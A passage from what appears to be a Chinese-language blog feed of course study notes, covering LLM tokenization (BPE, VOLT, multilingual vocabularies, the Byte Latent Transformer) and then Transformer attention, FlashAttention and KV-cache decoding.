“isn’t”</p><p><strong>优缺点</strong>： - ✅ 实现简单 - ❌超出词汇表（OOV）标记（例如，“Covid”） - ❌词汇大小与未知标记之间的权衡： - 较小的词汇 → 较少的参数，更多的 OOV -较大的词汇 → 更多的参数，较少的 OOV - ❌对于没有空格的语言（中文、日文、韩文、柬文）困难</p><h3 id="基于字符的分词">基于字符的分词</h3><p><strong>方法</strong>：每个字母和标点符号都是一个标记</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;The most eager is Oreg...&quot;</span><br><span class="line">↓</span><br><span class="line">[&quot;T&quot;, &quot;h&quot;, &quot;e&quot;, &quot; &quot;, &quot;m&quot;, &quot;o&quot;, &quot;s&quot;, &quot;t&quot;, &quot; &quot;, &quot;e&quot;, &quot;a&quot;, &quot;g&quot;, &quot;e&quot;, &quot;r&quot;, ...]</span><br></pre></td></tr></table></figure><p><strong>优点</strong>： - ✅ 词汇量非常小（除了像中文这样的语言） -✅ 没有 OOV 标记</p><p><strong>缺点</strong>： - ❌ 序列较长 - ❌ 标记不代表语义含义</p><h2 id="子词级别的分词">子词级别的分词</h2><h3 id="目标">目标</h3><ul><li>中等大小的词汇</li><li>无 OOV 标记</li><li>通过子词序列表示稀有单词</li></ul><h3 id="字节对编码bpe">字节对编码（BPE）</h3><p><strong>起源</strong>：最初由 Philip Gage（1994）开发用于数据压缩</p><p><strong>构建词汇的算法</strong>： 1.用所有字符作为标记（加上单词结束符）及其频率初始化词汇 2.循环直到词汇大小达到容量： 1. 统计语料库中连续的标记对 2.排名并选择最频繁的对 3. 合并该对形成新标记，添加到词汇中 3.输出最终词汇</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">初始语料：</span><br><span class="line">cat: 90</span><br><span class="line">catch: 50</span><br><span class="line">rat: 80</span><br><span class="line">rattle: 40</span><br><span class="line"></span><br><span class="line">步骤 1：从字符开始</span><br><span class="line">词汇：&#123;a, c, e, h, l, t&#125;</span><br><span class="line"></span><br><span class="line">步骤 2：合并 &#x27;a&#x27; + &#x27;t&#x27;（最频繁）</span><br><span class="line">词汇：&#123;a, c, e, h, l, t, at&#125;</span><br><span class="line"></span><br><span class="line">步骤 3：合并 &#x27;c&#x27; + &#x27;at&#x27;</span><br><span class="line">词汇：&#123;a, c, e, h, l, t, at, cat&#125;</span><br><span class="line"></span><br><span class="line">步骤 4：合并 &#x27;r&#x27; + &#x27;at&#x27;</span><br><span class="line">词汇：&#123;a, c, e, h, l, t, at, cat, rat&#125;</span><br><span class="line"></span><br><span class="line">步骤 5：合并 &#x27;cat&#x27; + &#x27;c&#x27;</span><br><span class="line">词汇：&#123;a, c, e, h, l, t, at, cat, rat, catc&#125;</span><br></pre></td></tr></table></figure><p><strong>分词过程</strong>： 1. 通过空格或其他分隔符拆分文本 2. 重复：- 贪婪地找到与 BPE 字典中标记匹配的最长前缀 -拆分并处理剩余部分，直到没有更多文本</p><p><strong>示例输出</strong>： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;The most eager is Oregon which is enlisting 5,000 drivers in the country&#x27;s biggest experiment.&quot;</span><br><span class="line">↓</span><br><span class="line">[&quot;The&quot;, &quot;most&quot;, &quot;eager&quot;, &quot;is&quot;, &quot;Oregon&quot;, &quot;which&quot;, &quot;is&quot;, &quot;en&quot;, &quot;listing&quot;, &quot;5,000&quot;, &quot;driver&quot;, &quot;s&quot;, &quot;in&quot;, &quot;the&quot;, &quot;country&quot;, &quot;&#x27;s&quot;, &quot;big&quot;, &quot;g&quot;, &quot;est&quot;, &quot;experiment&quot;, &quot;.&quot;]</span><br></pre></td></tr></table></figure></p><p><strong>代码示例</strong>：</p><ul><li>官方示例：<ahref="https://github.com/llmsystem/llmsys_code_examples/blob/main/tokenization/tokenization.ipynb">llmsys_code_examples/tokenization</a></li><li><strong>我的实现</strong>：请参见 <ahref="../CS336/CS336-Assignment-1-Building-a-Transformer-Language-Model-from-Scratch.html#2-bpe-tokenizer">CS336作业 1：BPE 分词器</a> 以获取完整的从零实现，包括：<ul><li>带增量对更新的 BPE 训练算法</li><li>使用多进程的并行语料处理</li><li>内存优化技术</li><li>完整的编码器/解码器实现</li><li>代码：<ahref="https://github.com/XLOverflow/CS336_Transformer_from_Scratch">GitHub- CS336 Transformer</a></li></ul></li></ul><h2 id="信息论词汇volt">信息论词汇（VOLT）</h2><h3 id="动机">动机</h3><p>寻找最佳词汇通常需要： - 多次完整的训练和测试周期 -尝试不同的词汇大小（1k、10k、30k 标记） - 评估每种配置的 NLG/MT 性能</p><p><strong>挑战</strong>：我们能在不进行完整训练的情况下预测良好的词汇吗？</p><h3 id="测量词汇质量">测量词汇质量</h3><p><strong>1. 压缩指标</strong>： -<strong>每标记字节数（BPT）</strong>： <span class="math display">\[BPT= \frac{\text{utf8 字节}}{\text{标记}}\]</span></p><ul><li><strong>归一化序列长度（NSL）</strong>： <spanclass="math display">\[NSL = \frac{\text{标记}}{\text{LLaMA中的标记}}\]</span></li></ul><p><strong>2. 归一化熵</strong>： <spanclass="math display">\[\mathcal{H}(v) = -\frac{1}{l_v}\sum_{i \in v}P(i)\log P(i)\]</span></p><p>其中 <span class="math inline">\(l_v\)</span> 是词汇 <spanclass="math inline">\(v\)</span> 中所有标记的平均字符数。</p><p><strong>解释</strong>：测量每个字符的语义信息。越小越好（歧义少，更容易生成）。</p><p><strong>示例</strong>： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">词汇 1: &#123;a: 200, e: 90, c: 30, t: 30, s: 90&#125;</span><br><span class="line">→ H(v) = 1.37</span><br><span class="line"></span><br><span class="line">词汇 2: &#123;a: 100, aes: 90, cat: 30&#125;</span><br><span class="line">→ H(v) = 0.14 ✓ 更好！</span><br></pre></td></tr></table></figure></p><h3 id="词汇的边际效用muv">词汇的边际效用（MUV）</h3><p><strong>定义</strong>： <span class="math display">\[M_{v_k\rightarrow v_{k+m}} = -\frac{H(v_k) - H(v_{k+m})}{m}\]</span></p><ul><li><strong>价值</strong>：归一化熵（语义信息）</li><li><strong>成本</strong>：词汇大小</li><li><strong>MUV</strong>：相对于大小的归一化熵的负梯度</li><li><strong>解释</strong>：每增加一个标记带来的价值</li></ul><h3 id="关键发现muv-预测性能">关键发现：MUV 预测性能</h3><p>经验观察： - <strong>最大 MUV 与最佳 BLEU 分数相关</strong> - MUV 和BLEU 在约 2/3 的任务中相关 - MUV 作为词汇质量的<strong>粗略评估指标</strong></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212205224848.png" alt="image-20260212205224848" style="zoom:30%;" /></p><h2 id="llm-中的实际考虑">LLM 中的实际考虑</h2><h3 id="语料去重和过滤">1. 语料去重和过滤</h3><p><strong>LLaMA 3 去重策略</strong>： - <strong>URL级去重</strong>：移除重复的 URL - <strong>文档级去重</strong>：使用MinHash - <strong>行级去重</strong>：对每 30M 文档使用 SHA-1 64 位哈希 -移除模板（导航菜单、Cookie 警告、联系信息）</p><p><strong>过滤</strong>： - 一行内的 N-gram 重复 - “脏字”计数 -标记分布的 KL 散度与语料库差异过大</p><h3 id="现代子词分词方法">2. 现代子词分词方法</h3><p><strong>字节级 BPE（BBPE）</strong>： - 将语言视为 Unicode 字节序列 -对所有语言通用 - 无需语言特定的预处理</p><p><strong>WordPiece</strong>： - 类似于 BPE，但合并最大化 <spanclass="math inline">\(P(b|a)\)</span> 的对 - 用于 BERT</p><p><strong>SentencePiece</strong>： - 对空格和标点的统一处理 - 将空格 ’’ 替换为 _ (U+2581) - 然后拆分为字符并应用 BPE - 语言无关的方法</p><h3 id="处理代码预分词">3. 处理代码：预分词</h3><p>使用正则表达式智能地拆分序列：</p><p><strong>GPT-4 模式</strong>： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?i:&#x27;s|&#x27;t|&#x27;re|&#x27;ve|&#x27;m|&#x27;ll|&#x27;d)|[^\r\n\p&#123;L&#125;\p&#123;N&#125;]?\p&#123;L&#125;+|\p&#123;N&#125;&#123;1,3&#125;|...</span><br></pre></td></tr></table></figure></p><p>组成部分： - 英语缩写 - 单词（可选的前导非字母数字） - 数字（一次 1-3个） - 非字母数字字符 - 换行符 - 尾随空格</p><p><strong>示例</strong>：<code>.append</code> →单个标记（保持方法名称不变）</p><h3 id="处理数字">4. 处理数字</h3><p><strong>挑战</strong>：传统分词将每个数字单独处理，使得算术运算变得困难。</p><p><strong>xVal 方法</strong>（Golkar 等，2023）： - 用特殊标记<code>[NUM]</code> 替换数字 - 在离散标记嵌入旁边添加连续数值嵌入 -双头解码器： - <strong>标记头</strong>：预测下一个标记（logits） -<strong>数字头</strong>：预测数值</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212205430637.png" alt="image-20260212205430637" style="zoom:50%;" /></p><h3 id="多语言词汇">5. 多语言词汇</h3><p><strong>LLaMA 3 演变</strong>： - LLaMA 2：32k 标记 - LLaMA 3.1：128k标记 - 100k 来自 OpenAI 的 tiktoken（从 200k 减少） - 28k分配给多语言支持</p><p><strong>构建方法</strong>：</p><ol type="1"><li><strong>联合 BPE</strong>：合并来自多种语言的文档（LLaMA 3 中有 176种），在联合语料上应用 BPE</li><li><strong>每种语言 BPE +合并</strong>：为每种语言生成相同数量的标记，然后合并</li><li><strong>ALP 平衡</strong>：通过平衡各语言的平均对数概率分配容量</li></ol><p><strong>词汇共享的好处</strong>：</p><p>共享标记使跨语言转移成为可能。例如 - “television”在多种语言中的表现： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">英语: television      西班牙语: televisión</span><br><span class="line">法语: television       意大利语: television</span><br><span class="line">荷兰语: televisie      葡萄牙语: televisão</span><br><span class="line">瑞典语: television     芬兰语: televisio</span><br></pre></td></tr></table></figure></p><p>相似的拼写 → 共享的子词标记 → 多语言理解</p><h2 id="词汇共享与多语言性能">词汇共享与多语言性能</h2><h3 id="实验设置">实验设置</h3><p>Yuan 等（ACL 2024）的研究调查了： 1. 使用双语平行数据构建 10k指令微调数据集 2. 仅微调 LLaMA-7B 嵌入层 3. 评估翻译性能： -<strong>双语</strong>：监督语言对 -<strong>多语言</strong>：所有其他方向</p><h3 id="四个性能象限">四个性能象限</h3><table><thead><tr class="header"><th>象限</th><th>双语性能</th><th>多语言性能</th><th>示例语言</th></tr></thead><tbody><tr class="odd"><td><strong>互惠</strong></td><td>↑</td><td>↑</td><td>cs, da, fr, de</td></tr><tr class="even"><td><strong>利他</strong></td><td>↓</td><td>↑</td><td>ar, vi, zh, ko</td></tr><tr class="odd"><td><strong>停滞</strong></td><td>↓</td><td>↓</td><td>km, lo, gu, te</td></tr><tr class="even"><td><strong>自私</strong></td><td>↑</td><td>↓</td><td>hi</td></tr></tbody></table><p><strong>关键见解</strong>：在双语数据上微调并不总是对监督方向有利！</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212205611162.png" alt="image-20260212205611162" style="zoom:30%;" /></p><h3 id="语言家族的重要性">语言家族的重要性</h3><ul><li><strong>印欧语言</strong>：大多位于互惠象限</li><li><strong>非印欧语言</strong>：分布更为多样，包括利他和停滞象限</li></ul><h3 id="停滞象限过度分词问题">停滞象限：过度分词问题</h3><p><strong>根本原因</strong>：字节 BPE生成的字节序列比某些语言的字符计数更长。</p><p><strong>示例</strong>： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">饕 [tāo]（贪吃）→ 三个标记：[227, 234, 260]</span><br></pre></td></tr></table></figure></p><p><strong>解决方案 - 缩短</strong>： -移除常见字节前缀（例如，许多汉字的 227） - 改善双语和多语言性能</p><p><strong>实验结果</strong>： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方向：en→km   en→lo   en→gu   en→te</span><br><span class="line">完全微调：   10.1    7.0     10.0    17.0</span><br><span class="line">扩展：    11.9    6.9     0.5     7.2</span><br><span class="line">缩短：   12.7    9.4     11.3    21.6  ✓ 最佳</span><br></pre></td></tr></table></figure></p><p><strong>建议</strong>：对于过度分词的语言，缩短比扩展词汇更有效。</p><h2id="无分词器模型字节潜在变换器blt">无分词器模型：字节潜在变换器（BLT）</h2><p><strong>动机</strong>：完全消除分词器，直接处理字节。</p><p><strong>架构</strong>（Pagnoni 等，2024）：</p><ol type="1"><li><strong>字节级小型变换器</strong>：编码字节流</li><li><strong>基于熵的分组</strong>：通过交叉注意力将字节分组为补丁</li><li><strong>大型潜在变换器</strong>：预测下一个补丁（主要计算）</li><li><strong>解补丁</strong>：通过交叉注意力将补丁转换回字节序列</li><li><strong>小型字节级变换器</strong>：进行下一个字节预测</li></ol><p><strong>关键好处</strong>： - ✅ 无需分词器训练 - ✅ 对所有语言通用 -✅ 处理任何字节流（文本、代码、数据） - ✅ 动态粒度（基于熵的补丁）</p><p><strong>权衡</strong>： - 更复杂的架构 - 两级变换器层次 -交叉注意力开销</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212205638769.png" alt="image-20260212205638769" style="zoom:40%;" /></p><h2 id="总结">总结</h2><h3 id="关键要点">关键要点</h3><ol type="1"><li><strong>子词分词（BPE）</strong>：<ul><li>迭代合并最频繁的标记对</li><li>平衡词汇大小和 OOV 率</li><li>广泛使用（GPT、LLaMA 等）</li></ul></li><li><strong>信息论词汇（VOLT）</strong>：<ul><li>使用归一化熵测量词汇质量</li><li>MUV（词汇的边际效用）预测性能</li><li>解决熵约束的最优传输问题</li><li>避免昂贵的网格搜索</li></ul></li><li><strong>实际考虑</strong>：<ul><li>使用正则表达式进行代码的预分词</li><li>对数字的特殊处理（xVal 方法）</li><li>多级语料去重</li><li>多语言词汇分配</li></ul></li><li><strong>多语言挑战</strong>：<ul><li>词汇共享使跨语言转移成为可能</li><li>过度分词对某些语言有害（停滞象限）</li><li>缩短字节序列比扩展词汇更有效</li><li>语言家族影响共享好处</li></ul></li><li><strong>未来方向</strong>：<ul><li>无分词器模型（BLT）显示出潜力</li><li>简单性与效率之间的权衡</li><li>通过基于熵的补丁实现动态粒度</li></ul></li></ol><h2 id="参考文献">参考文献</h2><ol type="1"><li>Rico Sennrich 等. “Neural Machine Translation of Rare Words withSubword Units.” ACL 2016.</li><li>Xu, Zhou, Gan, Zheng, Li. “Vocabulary Learning via Optimal Transportfor Neural Machine Translation.” ACL 2021.</li><li>Kudo 和 Richardson. “SentencePiece: A simple and languageindependent approach to subword tokenization.” EMNLP 2018.</li><li>Dagan 等. “Getting the most out of your tokenizer for pre-trainingand domain adaptation.” ICML 2024.</li><li>Golkar 等. “xVal: A Continuous Numerical Tokenization for ScientificLanguage Models.” 2023.</li><li>Zheng 等. “Allocating large vocabulary capacity for cross-linguallanguage model pre-training.” EMNLP 2021.</li><li>Liang 等. “XLM-V: Overcoming the Vocabulary Bottleneck inMultilingual Masked Language Models.” EMNLP 2023.</li><li>Yuan 等. “How Vocabulary Sharing Facilitates Multilingualism inLLaMA?” ACL 2024.</li><li>Pagnoni 等. “Byte Latent Transformer: Patches Scale Better ThanTokens.” 2024.</li></ol><h2 id="演示工具">演示工具</h2><p>交互式分词器演示： - <ahref="https://belladorai.github.io/llama-tokenizer-js/example-demo/build/">LLaMA分词器</a> - <a href="https://koala.sh/tools/free-gpt-tokenizer">GPT分词器</a></p><hr /><p><em>本文基于 CMU 11-868 LLM 系统的讲义材料，由 Lei Li 提供。</em></p>]]></content>
      
      
      <categories>
          
          <category> CMU 11-868 LLM Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> LLM Systems </tag>
            
            <tag> 11868 </tag>
            
            <tag> Tokenization </tag>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15642 机器学习系统：Transformer、注意力机制与优化</title>
      <link href="/zh/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/"/>
      <url>/zh/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/</url>
      
        <content type="html"><![CDATA[<h1 id="transformer注意力机制与优化">Transformer、注意力机制与优化</h1><p>课程：15-442/15-642 机器学习系统 授课教师：Tianqi Chen 和 Zhihao Jia卡内基梅隆大学</p><h2 id="注意力机制">注意力机制</h2><p>注意力机制是一种使用权重组合各个状态的方法。</p><h3 id="基本概念">基本概念</h3><p>对于来自前一层输入 <span class="math inline">\(x_1, x_2, x_3,x_4\)</span> 的隐藏状态 <span class="math inline">\(h_1, h_2, h_3,h_4\)</span>：</p><p><span class="math display">\[h_t = \sum_{i=1}^{t} s_i x_t\]</span></p><p>其中 <span class="math inline">\(s_i\)</span>是”注意力分数”，用于计算位置 <span class="math inline">\(i\)</span>的输入与当前隐藏输出的相关程度。</p><h2 id="自注意力机制">自注意力机制</h2><p>自注意力机制将查询(query)和一组键值对(key-valuepairs)映射到输出。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209181943450.png" alt="image-20260209181943450" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182022983.png" alt="image-20260209182022983" style="zoom:30%;" /></p><h3 id="数学公式">数学公式</h3><p><span class="math display">\[A(Q, K, V) = \text{softmax}\left(\frac{QK^T}{\sqrt{d}}\right)V\]</span></p><p>其中： - <strong>Q (查询)</strong>：<span class="math inline">\(N\times d\)</span> 矩阵 - <strong>K (键)</strong>：<spanclass="math inline">\(N \times d\)</span> 矩阵 - <strong>V(值)</strong>：<span class="math inline">\(N \times d\)</span> 矩阵 -<strong>d</strong>：键/查询/值向量的维度 -<strong>N</strong>：序列长度</p><h3 id="计算步骤">计算步骤</h3><ol type="1"><li><p>从输入嵌入计算<strong>查询</strong>、<strong>键</strong>和<strong>值</strong>：</p><ul><li><span class="math inline">\(Q = X W^Q\)</span></li><li><span class="math inline">\(K = X W^K\)</span></li><li><span class="math inline">\(V = X W^V\)</span></li></ul></li><li><p>计算注意力分数：<span class="math inline">\(S =QK^T\)</span>（大小：<span class="math inline">\(N \timesN\)</span>）</p></li><li><p>按 <span class="math inline">\(\sqrt{d}\)</span> 缩放：<spanclass="math inline">\(S&#39; = S / \sqrt{d}\)</span></p></li><li><p>应用 softmax：<span class="math inline">\(A =\text{softmax}(S&#39;)\)</span></p></li><li><p>与值相乘：<span class="math inline">\(O = AV\)</span></p></li></ol><h2 id="多头自注意力机制">多头自注意力机制</h2><p>多头注意力通过在输入和输出上使用不同的线性变换来并行化注意力层。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182102524.png" alt="image-20260209182102524" style="zoom:40%;" /></p><h3 id="优势">优势</h3><ul><li><strong>更多并行性</strong>：可以同时处理多个表示子空间</li><li><strong>降低每个头的计算成本</strong>：每个头处理更小的维度</li></ul><h3 id="公式">公式</h3><p>对于每个头 <span class="math inline">\(i\)</span>： <spanclass="math display">\[Z_i = A(Q_i, K_i, V_i) = \text{softmax}\left(\frac{Q_iK_i^T}{\sqrt{d}}\right)V_i\]</span></p><p>最终输出： <span class="math display">\[Z = \text{MultiHead}(Q, K, V) = \text{Concat}(Z_0, \ldots, Z_7)W^O\]</span></p><p>通常使用 8 个头，每个头处理 <span class="math inline">\(d/8\)</span>维子空间。</p><h2 id="gpu上计算注意力的挑战">GPU上计算注意力的挑战</h2><h3 id="标准注意力计算">标准注意力计算</h3><p>朴素方法：<span class="math inline">\(O =\text{Softmax}(QK^T)V\)</span></p><p><strong>工作流程：</strong> 1. <span class="math inline">\(A =QK^T\)</span>：<span class="math inline">\(N \times N\)</span> 矩阵 2.<span class="math inline">\(A =\text{mask}(A)\)</span>（用于因果注意力） 3. <spanclass="math inline">\(A = \text{softmax}(A)\)</span>：<spanclass="math inline">\(N \times N\)</span> 矩阵 4. <spanclass="math inline">\(O = AV\)</span>：<span class="math inline">\(N\times d\)</span> 矩阵</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182126065.png" alt="image-20260209182126065" style="zoom:50%;" /></p><h3 id="主要挑战">主要挑战</h3><ol type="1"><li><strong>大型中间结果</strong>：<spanclass="math inline">\(O(N^2)\)</span> 注意力矩阵</li><li><strong>重复从 GPU 设备内存读写</strong>：内存带宽瓶颈</li><li><strong>无法扩展到长序列</strong>：二次方内存需求</li></ol><h2 id="gpu-内存层次结构">GPU 内存层次结构</h2><p><strong>NVIDIA A100 GPU：</strong> - <strong>每块共享内存(SRAM)</strong>：19 TB/s 带宽，20 MB 容量 - 块内所有线程可读写 -快速但容量小 - <strong>设备全局内存 (HBM - High BandwidthMemory，高带宽内存)</strong>：1.5 TB/s 带宽，80 GB 容量 - 所有线程可读写- <strong>比 SRAM 慢约 12.6 倍</strong> - 容量大但访问较慢</p><p><strong>HBM（高带宽内存）</strong> 是 GPU 的主内存 -它有很大的容量但比片上 SRAM 慢得多。FlashAttention的核心优化就是通过尽可能在快速的 SRAM 中完成计算来<strong>最小化 HBM访问</strong>。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182214092.png" alt="image-20260209182214092" style="zoom:50%;" /></p><h2id="flashattentionio感知的精确注意力">FlashAttention：IO感知的精确注意力</h2><h3 id="核心思想">核心思想</h3><p>通过分块计算注意力来减少全局内存访问</p><h3 id="两个主要技术">两个主要技术</h3><h4 id="分块tiling">1. 分块(Tiling)</h4><p>重构算法以逐块将查询/键/值从全局内存加载到共享内存：</p><ol type="1"><li>从 HBM 逐块加载输入到 SRAM</li><li>在片上计算相对于该块的注意力输出</li><li>通过缩放更新设备内存中的输出</li></ol><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182250362.png" alt="image-20260209182250362" style="zoom:50%;" /></p><h4 id="重计算recomputation">2. 重计算(Recomputation)</h4><p>不存储前向传播的注意力矩阵，在反向传播中重新计算</p><p><strong>权衡</strong>：增加 FLOPs 但减少内存 I/O</p><blockquote><p>在 GPU 中，带宽是瓶颈</p></blockquote><table><thead><tr class="header"><th>指标</th><th>标准方法</th><th>FlashAttention</th></tr></thead><tbody><tr class="odd"><td>GFLOPs</td><td>66.6</td><td>75.2 (+13%)</td></tr><tr class="even"><td>全局内存访问</td><td>40.3 GB</td><td>4.4 GB (-89%)</td></tr><tr class="odd"><td>运行时间</td><td>41.7 ms</td><td>7.3 ms (<strong>快5.7倍</strong>)</td></tr></tbody></table><h3 id="安全-softmax-与在线-softmax">安全 Softmax 与在线 Softmax</h3><p><strong>问题</strong>：16位浮点数的最大值为 65504（&lt; <spanclass="math inline">\(e^{12}\)</span>）</p><p><strong>解决方案</strong>：计算向量 <spanclass="math inline">\(x\)</span> 的 softmax 为：</p><p><span class="math display">\[m(x) := \max_i x_i\]</span> <span class="math display">\[f(x) := [e^{x_1-m(x)}, \ldots, e^{x_n-m(x)}]\]</span> <span class="math display">\[\ell(x) := \sum_i f(x)_i\]</span> <span class="math display">\[\text{softmax}(x) := \frac{f(x)}{\ell(x)}\]</span></p><p>对于两个向量 <span class="math inline">\(x^{(1)}\)</span> 和 <spanclass="math inline">\(x^{(2)}\)</span>：</p><p><span class="math display">\[m(x) = m([x^{(1)} \, x^{(2)}]) = \max(m(x^{(1)}), m(x^{(2)}))\]</span></p><p><span class="math display">\[f(x) = [e^{m(x^{(1)})-m(x)} f(x^{(1)}), \, e^{m(x^{(2)})-m(x)}f(x^{(2)})]\]</span></p><p><span class="math display">\[\ell(x) = e^{m(x^{(1)})-m(x)} \ell(x^{(1)}) + e^{m(x^{(2)})-m(x)}\ell(x^{(2)})\]</span></p><h3 id="flashattention-2-算法">FlashAttention-2 算法</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182344432.png" alt="image-20260209182344432" style="zoom:50%;" /></p><p><strong>输入</strong>：HBM 中的矩阵 <span class="math inline">\(Q, K,V \in \mathbb{R}^{N \times d}\)</span>，块大小 <spanclass="math inline">\(B_c\)</span>, <spanclass="math inline">\(B_r\)</span></p><p><strong>关键步骤：</strong> 1. 将 <spanclass="math inline">\(Q\)</span> 分成 <span class="math inline">\(T_r =\lceil N/B_r \rceil\)</span> 个大小为 <span class="math inline">\(B_r\times d\)</span> 的块 2. 将 <span class="math inline">\(K, V\)</span>分成 <span class="math inline">\(T_c = \lceil N/B_c \rceil\)</span>个大小为 <span class="math inline">\(B_c \times d\)</span> 的块 3.对每个查询块 <span class="math inline">\(i\)</span>： - 从 HBM 加载<span class="math inline">\(Q_i\)</span> 到 SRAM - 初始化输出 <spanclass="math inline">\(O_i^{(0)} = 0\)</span>，统计量 <spanclass="math inline">\(\ell_i^{(0)} = 0\)</span>，<spanclass="math inline">\(m_i^{(0)} = -\infty\)</span> - 对每个键/值块 <spanclass="math inline">\(j\)</span>： - 从 HBM 加载 <spanclass="math inline">\(K_j, V_j\)</span> 到 SRAM - 计算 <spanclass="math inline">\(S_i^{(j)} = Q_i K_j^T\)</span> - 使用在线 softmax更新统计量 - 计算部分输出并累积 - 将最终的 <spanclass="math inline">\(O_i\)</span> 写回 HBM</p><h3 id="并行化策略">并行化策略</h3><p><strong>线程块级别：</strong> -步骤1：将不同的<strong>头</strong>分配给不同的线程块（16-64个头） -步骤2：将不同的<strong>查询</strong>分配给不同的线程块 -<strong>为什么不划分键/值？</strong>线程块之间无法通信；在划分键/值时无法执行 softmax</p><p><strong>Warp 级别：</strong> - FlashAttention：跨 K/V分割需要通信来相加结果 ❌ - FlashAttention-2：跨 Q 分割避免通信 ✅</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182623284.png" alt="image-20260209182623284" style="zoom:50%;" /></p><h4id="为什么前向传播和反向传播的并行化策略不同">为什么前向传播和反向传播的并行化策略不同？</h4><p><strong>前向传播（按行/查询并行化）：</strong> - 计算 <spanclass="math inline">\(O = \text{softmax}(QK^T)V\)</span> -每个线程块独立处理不同的查询行 - <strong>不需要通信</strong> -不同行完全独立 - 就像学生们各自独立做不同的题目</p><p><strong>反向传播（按列/键值并行化）：</strong> - 计算梯度需要更新<span class="math inline">\(dQ\)</span>： <spanclass="math display">\[dQ_i = dQ_i + dS^{(j)} K_j\]</span> -这个更新需要<strong>累加</strong>来自不同 K/V 块的贡献 -每个列块都对同一个 <span class="math inline">\(dQ\)</span> 行有贡献 -需要通过 HBM 使用<strong>原子操作</strong>来协调更新 -就像学生们一起做同一道题的不同部分 - 结果必须合并</p><p><strong>关键区别：</strong>前向传播有独立的行计算，但反向传播需要累加来自不同块的贡献，需要通过 HBM和原子加法进行同步。</p><h3 id="性能表现">性能表现</h3><p><strong>FlashAttention 实现了：</strong> - 相比 PyTorch和其他基线<strong>快 2-4 倍</strong> - <strong>内存减少 10-20倍</strong> - 内存随序列长度<strong>线性</strong>增长（vs 二次方）</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182708246.png" alt="image-20260209182708246" style="zoom:50%;" /></p><h2 id="生成式-llm-推理自回归解码">生成式 LLM 推理：自回归解码</h2><h3 id="两个阶段">两个阶段</h3><h4 id="预填充阶段第0次迭代">1. 预填充阶段（第0次迭代）</h4><ul><li>一次性处理<strong>所有</strong>输入token</li><li>计算整个提示的注意力</li><li>示例：<code>[Accelerating LLM requires machine]</code> →输出：<code>learning</code></li></ul><h4 id="解码阶段第1次迭代">2. 解码阶段（第1+次迭代）</h4><ul><li>处理从前一次迭代生成的<strong>单个</strong> token</li><li>使用所有先前 token 的注意力键和值</li><li>示例迭代：<ul><li>迭代1：<code>learning</code> → <code>systems</code></li><li>迭代2：<code>systems</code> → <code>optimizations</code></li><li>迭代3：<code>optimizations</code> → <code>[EOS]</code></li></ul></li></ul><h3 id="键值缓存kv-cache">键值缓存(KV Cache)</h3><p><strong>目的</strong>：保存注意力键和值用于后续迭代，避免重新计算</p><p><strong>内存</strong>：随序列长度线性增长</p><p><strong>解码中的注意力计算：</strong> - 查询：单个新 token -键/值：所有先前的 token（来自缓存）</p><h2 id="flashattention-用于-llm-推理">FlashAttention 用于 LLM 推理</h2><h3 id="适用性">适用性</h3><p><strong>预填充阶段：</strong> ✅ <strong>是</strong> -可以使用不同的线程块/warp 计算不同的查询</p><p><strong>解码阶段：</strong> ❌ <strong>否</strong> -解码阶段只有一个查询 - FlashAttention <strong>顺序</strong>处理 K/V -<strong>对于长上下文的请求效率低</strong>（很多键/值）</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260209182830017.png" alt="image-20260209182830017" style="zoom:30%;" /></p><h2id="flash-decoding解码的并行注意力">Flash-Decoding：解码的并行注意力</h2><h3 